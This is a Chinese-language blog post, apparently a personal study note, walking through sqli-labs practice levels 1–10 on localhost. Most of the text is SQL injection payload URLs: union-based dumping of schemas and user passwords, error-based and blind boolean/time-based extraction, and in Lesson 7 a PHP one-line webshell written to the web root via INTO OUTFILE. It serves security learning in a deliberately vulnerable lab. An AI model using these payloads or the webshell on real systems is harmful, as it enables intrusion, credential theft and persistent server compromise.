@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="0x01 环境搭建 下载 sqli-lab 源码，地址为：https:&#x2F;&#x2F;github.com&#x2F;Audi-1&#x2F;sqli-labs 放置网站根目录下，修改db-creds.inc 文件，添加本机 mysql 账户密码 打开 sqli-lab 首页，点击运行 setup&#x2F;reset databse 数据库连接成功，接下来就可以测试了。">
+<meta name="keywords" content="sqli,sqli-libs">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-libs学习笔记(1-10关)">
+<meta property="og:url" content="http:&#x2F;&#x2F;zerokeeper.github.io&#x2F;web-security&#x2F;sqlilibs-learning-notes-1-10-off.html">
+<meta property="og:site_name" content="ZeroKeeper">
+<meta property="og:description" content="0x01 环境搭建 下载 sqli-lab 源码，地址为：https:&#x2F;&#x2F;github.com&#x2F;Audi-1&#x2F;sqli-labs 放置网站根目录下，修改db-creds.inc 文件，添加本机 mysql 账户密码 打开 sqli-lab 首页，点击运行 setup&#x2F;reset databse 数据库连接成功，接下来就可以测试了。">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;sqli-libs1.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;sqli-libs2.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;sqli-libs3.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;sqli-libs4.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;sqli-libs5.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;sqli-libs11.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;sqli-libs6.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;sqli-libs7.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;sqli-libs8.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;sqli-libs9.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;sqli-libs10.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;sqli-libs12.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;sqli-libs13.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;sqli-libs14.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;sqli-libs15.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;sqli-libs16.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;sqli-libs17.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;sqli-libs18.png">
+<meta property="og:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;sqli-libs19.png">
+<meta property="og:updated_time" content="2019-10-20T07:31:45.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;static-1257872780.cos.ap-shanghai.myqcloud.com&#x2F;sqli-libs1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>sqli-libs学习笔记(1-10关)</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/web-security/sqlmap-usage-summary.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/web-security/manual-injection-of-access-mssql-mysql-and-oracle.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zerokeeper.github.io/web-security/sqlilibs-learning-notes-1-10-off.html" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zerokeeper.github.io/web-security/sqlilibs-learning-notes-1-10-off.html&text=sqli-libs学习笔记(1-10关)" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zerokeeper.github.io/web-security/sqlilibs-learning-notes-1-10-off.html&title=sqli-libs学习笔记(1-10关)" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zerokeeper.github.io/web-security/sqlilibs-learning-notes-1-10-off.html&is_video=false&description=sqli-libs学习笔记(1-10关)" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=sqli-libs学习笔记(1-10关)&body=Check out this article: http://zerokeeper.github.io/web-security/sqlilibs-learning-notes-1-10-off.html" target="_blank" rel="noopener"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zerokeeper.github.io/web-security/sqlilibs-learning-notes-1-10-off.html&title=sqli-libs学习笔记(1-10关)" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zerokeeper.github.io/web-security/sqlilibs-learning-notes-1-10-off.html&title=sqli-libs学习笔记(1-10关)" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zerokeeper.github.io/web-security/sqlilibs-learning-notes-1-10-off.html&title=sqli-libs学习笔记(1-10关)" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zerokeeper.github.io/web-security/sqlilibs-learning-notes-1-10-off.html&title=sqli-libs学习笔记(1-10关)" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zerokeeper.github.io/web-security/sqlilibs-learning-notes-1-10-off.html&name=sqli-libs学习笔记(1-10关)&description=&lt;h2 id=&#34;0x01-环境搭建&#34;&gt;&lt;a href=&#34;#0x01-环境搭建&#34; class=&#34;headerlink&#34; title=&#34;0x01 环境搭建&#34;&gt;&lt;/a&gt;0x01 环境搭建&lt;/h2&gt;&lt;ol&gt;
+&lt;li&gt;下载 sqli-lab 源码，地址为：&lt;a href=&#34;https://github.com/Audi-1/sqli-labs&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://github.com/Audi-1/sqli-labs&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;放置网站根目录下，修改db-creds.inc 文件，添加本机 mysql 账户密码&lt;/li&gt;
+&lt;li&gt;打开 sqli-lab 首页，点击运行 setup/reset databse&lt;/li&gt;
+&lt;li&gt;数据库连接成功，接下来就可以测试了。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img src=&#34;https://static-1257872780.cos.ap-shanghai.myqcloud.com/sqli-libs1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-环境搭建"><span class="toc-number">1.</span> <span class="toc-text">0x01 环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02开始闯关"><span class="toc-number">2.</span> <span class="toc-text">0x02开始闯关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Lesson1-字符型注入"><span class="toc-number">2.1.</span> <span class="toc-text">Lesson1:字符型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lesson2-数字型注入"><span class="toc-number">2.2.</span> <span class="toc-text">Lesson2:数字型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lesson3-有括号的单引号报错"><span class="toc-number">2.3.</span> <span class="toc-text">Lesson3:有括号的单引号报错</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lesson4-双引号括号报错注入"><span class="toc-number">2.4.</span> <span class="toc-text">Lesson4:双引号括号报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lesson5-单引号二次注入"><span class="toc-number">2.5.</span> <span class="toc-text">Lesson5:单引号二次注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lesson6-双引号二次注入"><span class="toc-number">2.6.</span> <span class="toc-text">Lesson6:双引号二次注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lesson7-利用注入写入文件"><span class="toc-number">2.7.</span> <span class="toc-text">Lesson7:利用注入写入文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lesson8-布尔型盲注"><span class="toc-number">2.8.</span> <span class="toc-text">Lesson8:布尔型盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lesson9-时间型盲注"><span class="toc-number">2.9.</span> <span class="toc-text">Lesson9:时间型盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Lesson10-双引号时间型盲注"><span class="toc-number">2.10.</span> <span class="toc-text">Lesson10:双引号时间型盲注</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-参考"><span class="toc-number">3.</span> <span class="toc-text">0x03 参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        sqli-libs学习笔记(1-10关)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">ZeroKeeper</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2017-03-05T00:00:00.000Z" itemprop="datePublished">2017-03-05</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/web-security/">web-security</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/sqli/" rel="tag">sqli</a>, <a class="tag-link" href="/tags/sqli-libs/" rel="tag">sqli-libs</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><ol>
+<li>下载 sqli-lab 源码，地址为：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></li>
+<li>放置网站根目录下，修改db-creds.inc 文件，添加本机 mysql 账户密码</li>
+<li>打开 sqli-lab 首页，点击运行 setup/reset databse</li>
+<li>数据库连接成功，接下来就可以测试了。</li>
+</ol>
+<p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/sqli-libs1.png" alt=""></p>
+<a id="more"></a>
+<h2 id="0x02开始闯关"><a href="#0x02开始闯关" class="headerlink" title="0x02开始闯关"></a>0x02开始闯关</h2><h3 id="Lesson1-字符型注入"><a href="#Lesson1-字符型注入" class="headerlink" title="Lesson1:字符型注入"></a>Lesson1:字符型注入</h3><p>第一关我把整个详细的过程都写下来，后面就会略写。首先访问</p>
+<pre><code>http://localhost/sqli-labs/Less-1/?id=1  </code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/sqli-libs2.png" alt=""><br>访问正常</p>
+<pre><code>http://localhost/sqli-labs/Less-1/?id=1&apos;  </code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/sqli-libs3.png" alt=""><br>报错，发现报错信息多出一个单引号，后面闭合语句也是用的单引号。</p>
+<pre><code>http://localhost/sqli-labs/Less-1/?id=1&apos; and &apos;1&apos;=&apos;1</code></pre><p>返回正常，说明sql语句执行成功了，因为条件永远为真，所以正常返回。</p>
+<p>猜解字段数</p>
+<pre><code>http://localhost/sqli-labs/Less-1/?id=1&apos; order by 1--+</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/sqli-libs4.png" alt=""><br>正常，这里后面的注释除了用<code>--+</code>还可以是#的url编码%23也可以。</p>
+<p>测试到4的时候报错，说明字段数是3。</p>
+<pre><code>http://localhost/sqli-labs/Less-1/?id=1&apos; order by 4--+</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/sqli-libs5.png" alt=""></p>
+<p>确定显位数字</p>
+<pre><code>http://localhost/sqli-labs/Less-1/?id=-1&apos; union select 1,2,3--+</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/sqli-libs11.png" alt=""><br>发现2,3均可回显</p>
+<p>获取当前数据库名</p>
+<pre><code>http://localhost/sqli-labs/Less-1/?id=-1&apos; union select 1,(select database()) ,3--+</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/sqli-libs6.png" alt=""><br>报错注入，数据库名为：security</p>
+<p>还可以获取所有的数据库名</p>
+<pre><code>http://localhost/sqli-labs/Less-1/?id=-1&apos; union select 1,2,(select group_concat(schema_name) from information_schema.schemata)--+</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/sqli-libs7.png" alt=""><br>得到的数据库有：</p>
+<pre><code>information_schema,74cms,ZHIHUHOT_FULL_DATA,bookstore,challenges,demo,dvwa,easytalk,mlecms,mysql,performance_schema,security,test,testdb</code></pre><p>获取当前数据库security的表名</p>
+<pre><code>http://localhost/sqli-labs/Less-1/?id=-1&apos; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema =0x7365637572697479)--+</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/sqli-libs8.png" alt=""><br>(security的hex编码是7365637572697479)<br>得到security表名有：</p>
+<pre><code>emails,referers,uagents,users</code></pre><p>获取列名</p>
+<pre><code>http://localhost/sqli-labs/Less-1/?id=-1&apos; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema =0x7365637572697479 and table_name=0x7573657273)--+</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/sqli-libs9.png" alt=""></p>
+<p>获取数据</p>
+<pre><code>http://localhost/sqli-labs/Less-1/?id=-1&apos; union select 1,2,(select group_concat(id,0x7c,username,0x7c,password) from security.users)--+</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/sqli-libs10.png" alt=""></p>
+<p>得到：</p>
+<pre><code>1|Dumb|Dumb,2|Angelina|I-kill-you,3|Dummy|p@ssword,4|secure|crappy,5|stupid|stupidity,6|superman|genious,7|batman|mob!le,8|admin|admin,9|admin1|admin1,10|admin2|admin2,11|admin3|admin3,12|dhakkan|dumbo,14|admin4|admin4</code></pre><p>还可以获取数据库版本</p>
+<pre><code>http://localhost/sqli-labs/Less-1/?id=-1&apos; union select 1,version(),database()--+</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/sqli-libs12.png" alt=""></p>
+<p>OK！一次完整的sql注入过程结束了。</p>
+<h3 id="Lesson2-数字型注入"><a href="#Lesson2-数字型注入" class="headerlink" title="Lesson2:数字型注入"></a>Lesson2:数字型注入</h3><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/sqli-libs13.png" alt=""><br>先加个单引号，根据报错信息发现是数字型注入不需要单引号去闭合语句。<br>payload：</p>
+<pre><code>http://localhost/sqli-labs/Less-2/?id=1 and 1=2 union select 1,version(),database()--+</code></pre><h3 id="Lesson3-有括号的单引号报错"><a href="#Lesson3-有括号的单引号报错" class="headerlink" title="Lesson3:有括号的单引号报错"></a>Lesson3:有括号的单引号报错</h3><p>加单引号查看报错信息<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/sqli-libs14.png" alt=""><br>判断出只是多出一个括号而已，所以在单引号后面加一个后括号。<br>payload：</p>
+<pre><code>http://localhost/sqli-labs/Less-3/?id=1&apos;) and 1=2 union select 1,version(),database()--+</code></pre><h3 id="Lesson4-双引号括号报错注入"><a href="#Lesson4-双引号括号报错注入" class="headerlink" title="Lesson4:双引号括号报错注入"></a>Lesson4:双引号括号报错注入</h3><p>加单引号，没有报错，加双引号，报错。并且还需要闭合括号。<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/sqli-libs15.png" alt=""><br>payload：</p>
+<pre><code>http://localhost/sqli-labs/Less-4/?id=1&quot;) and 1=2 union select 1,version(),database()--+</code></pre><h3 id="Lesson5-单引号二次注入"><a href="#Lesson5-单引号二次注入" class="headerlink" title="Lesson5:单引号二次注入"></a>Lesson5:单引号二次注入</h3><p>加单引号报错，根据报错信息，确定的确是单引号闭合。但是根据前面单引号报错构成的payload没有回显信息，只是有you are in…<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/sqli-libs16.png" alt=""><br>这个网页可能只提示错误，不显示正确信息。<br>所以思路为利用错误提示信息来暴露数据库内的数据。<br>这里我一共找到三种方法。<br>利用floor函数报错：</p>
+<pre><code>http://localhost/sqli-labs/Less-5/?id=1&apos; and (select 1 from (select count(*),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a)b)limit 0,1--+</code></pre><p>利用extractvalue函数报错：</p>
+<pre><code>http://localhost/sqli-labs/Less-5/?id=1&apos; and extractvalue(1,concat(0x7e,(select database()),0x7e))limit 0,1--+</code></pre><p>利用updatexml函数报错：</p>
+<pre><code>http://localhost/sqli-labs/Less-5/?id=1&apos; and (updatexml(1,concat(0x3a,(select database())),1))limit 0,1--+</code></pre><p>limit m,n<br>其中m是指记录开始的index，从0开始，表示第一条记录<br>n是指从第m+1条开始，取n条。</p>
+<h3 id="Lesson6-双引号二次注入"><a href="#Lesson6-双引号二次注入" class="headerlink" title="Lesson6:双引号二次注入"></a>Lesson6:双引号二次注入</h3><p>只需要把上面id的单引号变成双引号即可。</p>
+<h3 id="Lesson7-利用注入写入文件"><a href="#Lesson7-利用注入写入文件" class="headerlink" title="Lesson7:利用注入写入文件"></a>Lesson7:利用注入写入文件</h3><p>利用注入写入文件，在知道绝对路径的情况下可以写入一句话木马。<br>outfile函数：</p>
+<pre><code>select into outfile //将表的内容导出为一个文本文件 
+select [列名] from table [where 语句]
+into outfile ‘目标文件’ [option];</code></pre><p>dumpfile函数 将表的内容导出一行</p>
+<pre><code>select * from users limit 0,1 into dumpfile &apos;c:/2.txt&apos;;</code></pre><p>load_file函数 将数据导入mysql</p>
+<pre><code>select load_file (&apos;c:/1.txt&apos;)</code></pre><p>首先判断出需要什么闭合，这个过程我这里就省略了。<br>经过几番判断得出是<code>&#39;))</code>闭合。</p>
+<p>读写权限测试：</p>
+<pre><code>http://localhost/sqli-labs/Less-7/?id=1&apos;))and (select count(*)from mysql.user)&gt;0 --+ //如果返回正常则有读写权限</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/sqli-libs17.png" alt=""></p>
+<p>写入一句话小马，实际情况需要绝对路径才行。这里就把它当做已知。</p>
+<pre><code>http://localhost/sqli-labs/Less-7/?id=1&apos;)) union select 1,&apos;&lt;?php eval($_POST[&quot;123&quot;]);?&gt;&apos;,3 into outfile &apos;/var/www/html/test.php&apos;--+</code></pre><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/sqli-libs18.png" alt=""><br>这里虽然报错，但的确是成功写入了<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/sqli-libs19.png" alt=""></p>
+<p>还可以将一句话木马上传到网站目录上</p>
+<pre><code>http://localhost/sqli-labs/Less-7/?id=1&apos;)) union select 1,load_file(&quot;/var/www/html/sqli-libs/Less-7/result.txt&quot;),3 into outfile &apos;/var/www/html/1.php&apos;--+</code></pre><h3 id="Lesson8-布尔型盲注"><a href="#Lesson8-布尔型盲注" class="headerlink" title="Lesson8:布尔型盲注"></a>Lesson8:布尔型盲注</h3><pre><code>Less-8/?id=1  //显示You are in…
+Less-8/?id=1&apos; //不显示错误。但无返回信息
+Less-8/?id=1&apos; and &apos;1&apos;=&apos;1  //显示You are in…
+Less-8/?id=1&apos; and &apos;1&apos;=&apos;2  //不显示错误。但无返回信息</code></pre><p>通过一番测试知道这是一道布尔型注入题，id为单引号，字符型数据。<br>盲注其实是sql注入的一种，之所以称为盲注是因为他不会根据你sql注入的攻击语句返回你想要知道的错误信息。<br>盲注分为两类：<br>　　　　1.布尔盲注　布尔很明显Ture跟Fales，也就是说它只会根据　　　　你的注入信息返回Ture跟Fales，也就没有了之前的报错信息。<br>　　　　2.时间盲注　界面返回值只有一种,true 无论输入任何值 返回情况都会按正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。<br>　　需要用到的函数：</p>
+<pre><code>Length（）函数 返回字符串的长度
+Substr（）截取字符串
+Ascii（）返回字符的ascii码
+sleep(n)：将程序挂起一段时间 n为n秒
+if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</code></pre><p>猜测数据库名长度</p>
+<pre><code>http://localhost/sqli-labs/Less-8/?id=1&apos; and (length(database()))&gt;10--+  //不显示错误。但无返回信息
+http://localhost/sqli-labs/Less-8/?id=1&apos; and (length(database()))&gt;5 --+  //显示You are in…</code></pre><p>说明长度大于5小于10<br>最后得到结果为</p>
+<pre><code>http://localhost/sqli-labs/Less-8/?id=1&apos; and (length(database()))=8--+  //显示You are in…</code></pre><p>长度为8也就是security,接下来利用substr函数与ascii函数构造猜测数据库名ascii码的值的语句 因为现在只知道长度不知道具体内容</p>
+<pre><code>http://localhost/sqli-labs/Less-8/?id=1&apos; and (ascii(substr(database(),1,1)))&gt;100 --+  //显示You are in…
+http://localhost/sqli-labs/Less-8/?id=1&apos; and (ascii(substr(database(),1,1)))&gt;120 --+  //不显示错误。但无返回信息</code></pre><p>说明数据库的第一个字母的ascii的值在100~120之间。最后用二分法逐步逼近确定在115</p>
+<pre><code>http://localhost/sqli-labs/Less-8/?id=1&apos; and (ascii(substr(database(),1,1)))=115 --+  //显示You are in…</code></pre><p>通过查ascii码表可知 ascii（115）=s 也就是security 的第一个字母，通过改变database（）后面的数字 可以继续猜测第二个字母第三个字母，接下来改变语句去猜测表名。</p>
+<pre><code>http://localhost/sqli-labs/Less-8/?id=1&apos; and (ascii(substr(database(),2,1)))=101 --+  //显示You are in…</code></pre><p>ascii（101）=e也就是security 的第二个字母，后面以此类推。</p>
+<p>接下来改变语句去猜测表名，其实并不需要上面猜测数据库名的过程。</p>
+<pre><code>http://localhost/sqli-labs/Less-8/?id=1&apos; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;100 --+  //显示You are in…</code></pre><p>继续</p>
+<pre><code>http://localhost/sqli-labs/Less-8/?id=1&apos; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;110 --+  //不显示错误。但无返回信息</code></pre><p>二分法查找最后得到</p>
+<pre><code>http://localhost/sqli-labs/Less-8/?id=1&apos; and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1)))=114 --+  //显示You are in…</code></pre><p>猜测列名</p>
+<pre><code>http://localhost/sqli-labs/Less-8/?id=1&apos; and (ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),1,1)))&gt;100 --+ //显示You are in…</code></pre><p>采用二分法得 ascii为 105 为i 也就是表的第一个列名 id的第一个字母 同样 通过修改 limit 0,1 获取第二个列名 修改后面1,1的获取当前列的其他字段。接着获username 与 password 里面的内容 因为知道了列名所以直接 select password from users 就可以获取password里面的内容 username一样。</p>
+<pre><code>http://localhost/sqli-labs/Less-8/?id=1&apos;  and (ascii(substr(( select password from users limit 0,1),1,1)))=68--+  //显示You are in…</code></pre><p>手工盲注非常繁琐需要一个一个的试，不过现在还是先学习手工理解了sql注入的原理，熟悉了以后可以采用脚本工具自动化测试。</p>
+<h3 id="Lesson9-时间型盲注"><a href="#Lesson9-时间型盲注" class="headerlink" title="Lesson9:时间型盲注"></a>Lesson9:时间型盲注</h3><p>无论怎么更改注入语句，页面都不会发生改变,说明无论输入正确与否都只显示you are in。最后测试基于时间。</p>
+<pre><code>http://localhost/sqli-labs/Less-9/?id=1&apos; and if(1=1,sleep(5),null)--+ //显示You are in…但是有延迟</code></pre><p>说明存在注入，可以用基于时间的盲注。</p>
+<pre><code>http://localhost/sqli-labs/Less-9/?id=1&apos; and (if(ascii(substr(database(),1,1))&gt;100,sleep(5),null))--+  //显示You are in…但是有延迟</code></pre><p>如果返回正确，则页面会停顿10秒，返回错误则会立马返回。其他与布尔盲注都相似的。</p>
+<h3 id="Lesson10-双引号时间型盲注"><a href="#Lesson10-双引号时间型盲注" class="headerlink" title="Lesson10:双引号时间型盲注"></a>Lesson10:双引号时间型盲注</h3><p>基于时间的盲注，双引号<br>同上，用双引号进行闭合即可。</p>
+<h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p>1.<a href="http://mtfly.net/108" target="_blank" rel="noopener">sqli-labs详细通关指南</a><br>2.<a href="https://clearloveqaq.github.io/2016/10/25/sqli-labs%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">sqli-labs学习笔记总结</a></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
